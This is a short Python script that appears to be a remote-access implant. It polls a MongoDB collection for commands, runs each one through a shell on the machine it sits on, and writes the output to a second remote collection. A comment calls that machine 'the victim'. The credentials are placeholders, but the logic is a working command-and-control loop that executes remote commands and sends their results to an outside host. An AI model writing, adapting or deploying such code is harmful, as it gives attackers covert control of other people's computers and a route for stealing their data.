from asyncio.subprocess import PIPE
import base64
from sys import stderr
import pymongo
import subprocess
import base64

cluster = pymongo.MongoClient(THE MONGOCLIENT CREDENTIALS)


db = cluster.get_database(NAME OF THE DATABASE)

collection = db.get_collection(THE COLLECTION OF COMMANDS)


def lendo_e_executando():

    # First the victim needs to query the command

    busca = collection.find({})
    for x in busca:
        cmd = subprocess.Popen(x['commands'], shell=True, stdout=PIPE, stderr=PIPE)
        stdout, stderr = cmd.communicate()
        encoding = base64.b64encode(stdout)
        collection2 = db.get_collection(THE COLLECTION OF RESPONSES)
        output = {
            'output' :f'{stdout}'
        }
        collection2.insert_one(output)
    


lendo_e_executando()
